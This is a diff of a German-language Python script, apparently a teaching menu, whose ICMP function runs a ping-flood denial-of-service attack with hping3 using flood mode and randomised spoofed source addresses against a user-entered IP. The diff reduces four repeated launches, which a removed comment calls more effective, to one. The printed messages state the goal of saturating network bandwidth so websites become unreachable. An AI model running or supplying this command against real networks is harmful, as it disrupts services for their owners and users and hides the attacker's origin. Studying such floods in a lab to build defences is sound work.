@@ -34,14 +34,8 @@ def ICMP_MENU():
 		print("Jetzt erst beginnt der tatsächliche Angriff.\nDer Angriff kann jederzeit mit CTRL+C abgebrochen werden.")
 		
 		command = rlinput('Starten des Ping-Floodings mit: \n# ', 'hping3 --flood --rand-source --icmp ' + ip_adress )
-		# Starte hping3 mehrfach um einen effektiveren Angriff durchzuführen
-		execute(command)
-		execute(command)
-		execute(command)
-		execute(command)
-
 		
-		
+		execute(command)
 
 		print('Nun soll die Bandbreite des Netzes ausgelastet sein und die Verbindung mit z.B. einer Webseite nicht mehr möglich sein.\n')
 		print('Ende des ICMP/Ping-Flood-Tutorials erreicht! \n Bitte eine Option zum Fortfahren wählen: \n')
